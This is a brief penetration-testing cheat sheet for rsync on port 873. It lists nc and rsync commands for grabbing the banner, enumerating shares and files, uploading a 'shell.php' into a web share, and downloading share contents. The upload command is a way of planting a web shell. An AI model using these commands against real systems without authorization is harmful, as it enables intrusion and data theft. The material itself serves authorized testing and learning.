---
description: >-
  rsync is a utility for efficiently transferring and synchronizing files
  between a computer and an external hard drive and across networked computers.
---

# Port 873 - rsync

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync" %}

### Enumeration

```bash
# Check banner and version number, etc.
nc -vn $RHOST 873

# Enumerate share folders 
rsync <Target IP>:: 
rsync 10.10.100.27::  

# Enumerate files 
rsync -av rsync://10.10.100.27/httpd 
rsync -av --list-only rsync://10.10.100.27/httpd  
```

### FIle Upload & Download&#x20;

```bash
# Upload files
rsync shell.php 10.10.100.27::httpd 
 
# Download files
rsync -r 10.10.100.27::httpd/ .  
```

